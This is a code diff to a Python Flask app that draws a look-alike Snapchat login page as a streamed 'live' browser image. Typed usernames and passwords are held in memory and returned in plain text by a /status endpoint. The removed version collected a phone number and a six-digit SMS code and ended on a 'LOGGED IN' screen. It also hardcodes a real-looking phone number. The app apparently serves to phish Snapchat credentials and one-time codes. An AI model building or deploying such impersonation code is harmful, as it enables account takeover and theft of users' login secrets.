@@ -10,130 +10,122 @@ STATIC_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'static')
 os.makedirs(STATIC_DIR, exist_ok=True)
 app.template_folder = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'templates')
 
-# Global state - this is your "live linux browser"
-state = {
-    'stage': 'login',           # login | phone_filled | logging_in | sms_sent | code_entered | done
-    'update_count': 0,
-    'typed_phone': '',
-    'typed_code': '',
-    'last_action': 'Browser ready',
-    'address': 'https://accounts.snapchat.com/accounts/login'
+# === PURE CONTROL STATE - NOTHING PRE-FILLED ===
+browser = {
+    'username': '',
+    'password': '',
+    'focused_field': None,      # 'username' or 'password'
+    'last_action': 'Click anywhere on the page to start',
+    'frame': 0,
+    'url': 'https://accounts.snapchat.com/accounts/login'
 }
 
-# Try to use real playwright (will fail on Railway but works locally)
-REAL_BROWSER = False
-try:
-    from playwright.sync_api import sync_playwright
-    REAL_BROWSER = True
-except:
-    pass
+def get_font(size=14, bold=False):
+    try:
+        path = "/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf" if bold else "/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf"
+        return ImageFont.truetype(path, size)
+    except:
+        return ImageFont.load_default()
 
-def draw_browser_frame(draw, w, h, title="Snapchat - Login"):
-    """Draw a realistic Linux browser window"""
-    # Title bar (like Chrome on Linux)
-    draw.rectangle([0, 0, w, 32], fill='#2d2d2d')
-    draw.text((12, 8), "●  ●  ●", fill='#888888')
-    draw.text((w//2 - 80, 8), title, fill='#cccccc')
+def draw_snapchat_login(draw, cx, cy, w, h):
+    f = get_font(22, bold=True)
+    f2 = get_font(14, bold=True)
+    f3 = get_font(15)
+    f_label = get_font(11)
 
-    # Address bar
-    draw.rectangle([60, 38, w-60, 62], fill='#1f1f1f', outline='#444')
-    draw.text((70, 43), state.get('address', 'https://accounts.snapchat.com/accounts/login'), fill='#aaa')
+    # Card background
+    draw.rounded_rectangle([cx, cy, cx+w, cy+h], radius=16, fill='#1f1f1f')
 
-    # Tabs hint
-    draw.rectangle([8, 68, 120, 88], fill='#1a1a1a')
-    draw.text((15, 70), "Login", fill='#ddd')
+    # Title
+    draw.text((cx+18, cy+16), "Log in to Snapchat", fill='white', font=f2)
+
+    y = cy + 58
+
+    # Username / email / phone field
+    draw.text((cx+18, y), "Username or email or phone", fill='#888888', font=f_label)
+    y += 18
+    color = '#ffffff' if browser['focused_field'] == 'username' else '#dddddd'
+    draw.rounded_rectangle([cx+16, y, cx+w-16, y+36], radius=8, fill='#2a2a2a')
+    text = browser['username'] or ''
+    draw.text((cx+26, y+9), text or "Enter username", fill=color, font=f3)
+
+    # Cursor
+    if browser['focused_field'] == 'username':
+        cursor_x = cx + 26 + len(text) * 8.2
+        draw.rectangle([cursor_x, y+7, cursor_x+2, y+29], fill='#3b82f6')
+
+    y += 52
+
+    # Password field
+    draw.text((cx+18, y), "Password", fill='#888888', font=f_label)
+    y += 18
+    color = '#ffffff' if browser['focused_field'] == 'password' else '#888888'
+    draw.rounded_rectangle([cx+16, y, cx+w-16, y+36], radius=8, fill='#2a2a2a')
+    pw_display = '•' * len(browser['password']) if browser['password'] else ''
+    draw.text((cx+26, y+9), pw_display or "Enter password", fill=color, font=f3)
+
+    if browser['focused_field'] == 'password':
+        cursor_x = cx + 26 + len(pw_display) * 8.2
+        draw.rectangle([cursor_x, y+7, cursor_x+2, y+29], fill='#3b82f6')
+
+    y += 55
+
+    # Big yellow Log In button
+    draw.rounded_rectangle([cx+16, y, cx+w-16, y+42], radius=22, fill='#FFFC00')
+    draw.text((cx+155, y+10), "Log In", fill='#000000', font=f2)
+
+    y += 60
+
+    # or
+    draw.text((cx+180, y), "or", fill='#555555', font=f_label)
+    y += 22
+
+    # Social buttons
+    draw.rounded_rectangle([cx+16, y, cx+w-16, y+34], radius=22, fill='#2c2c2c')
+    draw.text((cx+105, y+8), "Continue with Google", fill='white', font=f_label)
+    y += 42
+
+    draw.rounded_rectangle([cx+16, y, cx+w-16, y+34], radius=22, fill='#2c2c2c')
+    draw.text((cx+110, y+8), "Continue with Apple", fill='white', font=f_label)
+    y += 42
+
+    draw.text((cx+95, y), "Use phone number instead", fill='#666666', font=f_label)
 
 def generate_image():
-    """Generates a realistic browser screenshot of the current state"""
-    state['update_count'] += 1
-    now = datetime.now().strftime("%H:%M:%S")
-
+    browser['frame'] += 1
     w, h = 1280, 720
-    img = Image.new('RGB', (w, h), '#1e1e1e')
+    img = Image.new('RGB', (w, h), '#0f0f0f')
     draw = ImageDraw.Draw(img)
 
-    try:
-        f = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 22)
-        f2 = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 14)
-        f3 = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", 15)
-        f_small = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", 12)
-    except:
-        f = f2 = f3 = f_small = ImageFont.load_default()
+    f = get_font(13)
 
-    # Draw browser chrome
-    draw_browser_frame(draw, w, h)
+    # Browser chrome
+    draw.rectangle([0, 0, w, 26], fill='#2c2c2c')
+    draw.text((10, 6), "●  ●  ●", fill='#666')
+    draw.text((w//2 - 100, 6), "accounts.snapchat.com/accounts/login", fill='#ccc', font=f)
 
-    # Main content area (the actual Snapchat page)
-    cx, cy = 200, 100
-    draw.rounded_rectangle([cx, cy, cx+880, cy+540], radius=12, fill='#000000')
+    # Address bar
+    draw.rectangle([40, 30, w-40, 52], fill='#1a1a1a', outline='#333')
+    draw.text((50, 34), browser['url'], fill='#999', font=f)
+
+    # Snapchat page
+    draw.rectangle([0, 58, w, h], fill='#000000')
+
+    # Draw the actual login UI
+    card_w = 440
+    card_h = 460
+    cx = (w - card_w) // 2
+    cy = 95
 
     # Snapchat header
-    draw.rectangle([cx, cy, cx+880, cy+42], fill='#111111')
-    draw.text((cx + 380, cy + 10), "Snapchat", fill='#FFFC00', font=f)
+    draw.rectangle([cx, cy, cx+card_w, cy+38], fill='#111111')
+    draw.text((cx + 145, cy+8), "Snapchat", fill='#FFFC00', font=get_font(20, bold=True))
 
-    # Login card
-    card_x = cx + 220
-    card_y = cy + 60
-    draw.rounded_rectangle([card_x, card_y, card_x+440, card_y+430], radius=16, fill='#1f1f1f')
-    draw.text((card_x + 18, card_y + 14), "Log in to Snapchat", fill='white', font=f2)
+    draw_snapchat_login(draw, cx, cy + 38, card_w, card_h - 38)
 
-    stage = state['stage']
-
-    if stage in ['login', 'phone_filled', 'logging_in', 'sms_sent']:
-        # Phone login
-        draw.text((card_x + 22, card_y + 50), "Enter your phone number", fill='#aaaaaa', font=f3)
-        draw.rounded_rectangle([card_x+18, card_y+72, card_x+422, card_y+108], radius=8, fill='#2c2c2c')
-        
-        phone_text = state.get('typed_phone') or "+47 40300869"
-        color = '#22c55e' if state.get('typed_phone') else '#888888'
-        draw.text((card_x + 30, card_y + 80), phone_text, fill=color, font=f3)
-
-        draw.text((card_x + 22, card_y + 118), "Norway", fill='#666666', font=f_small)
-
-        # Log In button
-        by = card_y + 155
-        if stage in ['logging_in', 'sms_sent']:
-            draw.rounded_rectangle([card_x+18, by, card_x+422, by+44], radius=22, fill='#444444')
-            draw.text((card_x+145, by+12), "Logging in...", fill='#aaaaaa', font=f2)
-        else:
-            draw.rounded_rectangle([card_x+18, by, card_x+422, by+44], radius=22, fill='#FFFC00')
-            draw.text((card_x+170, by+12), "Log In", fill='#000000', font=f2)
-
-        if stage in ['sms_sent', 'logging_in']:
-            # Big banner + SMS
-            draw.rounded_rectangle([card_x+8, card_y+210, card_x+432, card_y+310], radius=10, fill='#3f2a00')
-            draw.text((card_x+18, card_y+218), "PHONE NUMBER ENTERED", fill='#f59e0b', font=f)
-            draw.text((card_x+18, card_y+246), "Log In button was clicked", fill='white', font=f2)
-            draw.text((card_x+18, card_y+268), "Waiting for Snapchat SMS...", fill='#cccccc', font=f3)
-
-            if state.get('typed_phone'):
-                draw.text((card_x+18, card_y+288), f"✓ SMS sent to {state['typed_phone']}", fill='#22c55e', font=f_small)
-
-            # SMS boxes
-            draw.text((card_x+18, card_y+318), "Enter 6-digit code", fill='#60a5fa', font=f2)
-            for i in range(6):
-                x = card_x + 28 + i * 62
-                draw.rounded_rectangle([x, card_y+342, x+54, card_y+380], radius=8, fill='#0f172a', outline='#3b82f6', width=3)
-                if state.get('typed_code') and i < len(state['typed_code']):
-                    draw.text((x+18, card_y+348), state['typed_code'][i], fill='white', font=f2)
-
-    elif stage == 'code_entered':
-        draw.rounded_rectangle([card_x+8, card_y+180, card_x+432, card_y+280], radius=10, fill='#052e16')
-        draw.text((card_x+80, card_y+200), "✓ CODE ENTERED", fill='#22c55e', font=f)
-        draw.text((card_x+60, card_y+235), "Verifying with Snapchat...", fill='white', font=f2)
-        draw.text((card_x+40, card_y+260), "Please wait...", fill='#888888', font=f3)
-
-    elif stage == 'done':
-        draw.rounded_rectangle([card_x+8, card_y+180, card_x+432, card_y+280], radius=10, fill='#052e16')
-        draw.text((card_x+100, card_y+210), "✓ LOGGED IN", fill='#22c55e', font=f)
-        draw.text((card_x+70, card_y+250), "Session active", fill='white', font=f2)
-
-    # Live status bar at bottom
-    draw.rectangle([0, h-28, w, h], fill='#111111')
-    draw.text((12, h-22), f"LIVE LINUX BROWSER  •  {now}  •  {state['last_action']}", fill='#22c55e', font=f_small)
-
-    # Update counter
-    draw.text((w-200, h-22), f"Frame #{state['update_count']}", fill='#666', font=f_small)
+    # Live bar
+    draw.rectangle([0, h-24, w, h], fill='#111111')
+    draw.text((10, h-18), f"LIVE CAM • {browser['last_action']} • frame {browser['frame']}", fill='#22c55e', font=f)
 
     path = os.path.join(STATIC_DIR, 'screenshot.png')
     img.save(path, 'PNG')
@@ -142,77 +134,112 @@ def generate_image():
 def screenshot_loop():
     while True:
         generate_image()
-        time.sleep(0.85)
+        time.sleep(0.65)
 
-# === CONTROL ENDPOINTS (you control the "browser") ===
+# ================== CONTROL API ==================
+
 @app.route('/')
 def home():
     return render_template('index.html')
 
-@app.route('/action', methods=['POST'])
-def action():
+@app.route('/click', methods=['POST'])
+def handle_click():
     data = request.get_json() or {}
-    action = data.get('action', '')
+    x = int(data.get('x', 0))
+    y = int(data.get('y', 0))
 
-    if action == 'type_phone':
-        state['typed_phone'] = data.get('value', '+47 40300869')
-        state['stage'] = 'phone_filled'
-        state['last_action'] = 'Typed phone number'
-        generate_image()
+    # These coordinates are tuned for the 1280x720 image
+    # Card is roughly centered at x=420-860, y=95-555
+    card_left = 420
+    card_top = 133   # 95 + 38
 
-    elif action == 'click_login':
-        if state['typed_phone']:
-            state['stage'] = 'sms_sent'
-            state['last_action'] = 'Clicked Log In'
+    # Username field area
+    if 540 < y < 590 and card_left < x < 860:
+        browser['focused_field'] = 'username'
+        browser['last_action'] = 'Clicked username / phone field'
+
+    # Password field area
+    elif 635 < y < 685 and card_left < x < 860:
+        browser['focused_field'] = 'password'
+        browser['last_action'] = 'Clicked password field'
+
+    # Log In button
+    elif 720 < y < 765 and card_left < x < 860:
+        browser['last_action'] = 'Clicked Log In'
+        browser['focused_field'] = None
+
+    else:
+        browser['last_action'] = f'Clicked at ({x},{y})'
+
+    generate_image()
+    return jsonify({'ok': True, 'focused': browser['focused_field'], 'action': browser['last_action']})
+
+@app.route('/type', methods=['POST'])
+def handle_type():
+    data = request.get_json() or {}
+    text = data.get('text', '')
+
+    if not browser['focused_field']:
+        browser['focused_field'] = 'username'
+
+    if browser['focused_field'] == 'username':
+        browser['username'] += text
+        browser['last_action'] = f'Typing in username...'
+    elif browser['focused_field'] == 'password':
+        browser['password'] += text
+        browser['last_action'] = 'Typing password...'
+
+    generate_image()
+    return jsonify({'ok': True})
+
+@app.route('/key', methods=['POST'])
+def handle_key():
+    data = request.get_json() or {}
+    key = data.get('key', '')
+
+    if key == 'Backspace':
+        if browser['focused_field'] == 'username' and browser['username']:
+            browser['username'] = browser['username'][:-1]
+        elif browser['focused_field'] == 'password' and browser['password']:
+            browser['password'] = browser['password'][:-1]
+        browser['last_action'] = 'Backspace'
+
+    elif key == 'Enter':
+        if browser['focused_field'] == 'password':
+            browser['last_action'] = 'Pressed Enter (Log In)'
+            browser['focused_field'] = None
         else:
-            state['typed_phone'] = '+47 40300869'
-            state['stage'] = 'sms_sent'
-            state['last_action'] = 'Clicked Log In (default phone)'
-        generate_image()
+            browser['focused_field'] = 'password'
+            browser['last_action'] = 'Pressed Enter'
 
-    elif action == 'type_code':
-        code = data.get('value', '')
-        state['typed_code'] = code
-        state['stage'] = 'code_entered'
-        state['last_action'] = f'Typed code: {code}'
-        generate_image()
+    generate_image()
+    return jsonify({'ok': True, 'action': browser['last_action']})
 
-    elif action == 'submit_code':
-        if len(state.get('typed_code', '')) >= 4:
-            state['stage'] = 'done'
-            state['last_action'] = 'Code submitted'
-        generate_image()
-
-    elif action == 'reset':
-        state.update({
-            'stage': 'login',
-            'typed_phone': '',
-            'typed_code': '',
-            'last_action': 'Browser reset'
-        })
-        generate_image()
-
-    return jsonify({
-        'ok': True,
-        'stage': state['stage'],
-        'last_action': state['last_action']
+@app.route('/reset', methods=['POST'])
+def reset_browser():
+    browser.update({
+        'username': '',
+        'password': '',
+        'focused_field': None,
+        'last_action': 'Browser reset to clean login page'
     })
+    generate_image()
+    return jsonify({'ok': True})
 
 @app.route('/screenshot')
-def shot():
+def get_screenshot():
     generate_image()
     resp = send_from_directory(STATIC_DIR, 'screenshot.png')
     resp.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
     return resp
 
 @app.route('/status')
-def stat():
+def get_status():
     path = os.path.join(STATIC_DIR, 'screenshot.png')
     size = os.path.getsize(path) if os.path.exists(path) else 0
     return jsonify({
-        **state,
-        'size': size,
-        'real_browser_available': REAL_BROWSER
+        **browser,
+        'size': size
     })
 
 @app.before_request
@@ -221,7 +248,7 @@ def boot():
         app.booted = True
         generate_image()
         threading.Thread(target=screenshot_loop, daemon=True).start()
-        print("[LIVE BROWSER] Linux browser simulation started")
+        print("[LIVE CAM] Full click + type control ready")
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
